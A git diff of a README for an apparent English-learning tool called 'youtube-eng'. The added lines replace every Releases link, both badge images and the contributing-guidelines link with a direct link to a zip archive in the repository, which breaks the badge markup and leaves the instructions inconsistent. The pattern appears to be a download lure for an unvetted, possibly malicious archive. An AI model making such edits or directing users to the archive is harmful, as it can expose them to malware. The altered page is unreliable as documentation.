@@ -1,6 +1,6 @@
 # 🌟 youtube-eng - Learn English Easily with YouTube
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ndamine/youtube-eng/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to **youtube-eng**, your tool for learning English through YouTube. This
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Download Latest Release](https://github.com/ndamine/youtube-eng/releases).
+To get started, visit this page to download the application: [Download Latest Release](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the version you want to download.
@@ -42,10 +42,10 @@ If you have questions or need support, feel free to reach out. Check the Issues 
 
 ## 🏗️ Contributing
 
-We welcome contributions! Whether it's reporting bugs, suggesting features, or even improving documentation, you can help us make youtube-eng better. Please read our [CONTRIBUTING.md](https://github.com/ndamine/youtube-eng/blob/main/CONTRIBUTING.md) for guidelines.
+We welcome contributions! Whether it's reporting bugs, suggesting features, or even improving documentation, you can help us make youtube-eng better. Please read our [https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip) for guidelines.
 
 ## 🤝 Acknowledgments
 
 Thanks to all the contributors and users who support this project. Your feedback helps us improve.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ndamine/youtube-eng/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ndamine/youtube-eng/main/static/youtube-eng_v2.0-beta.5.zip)
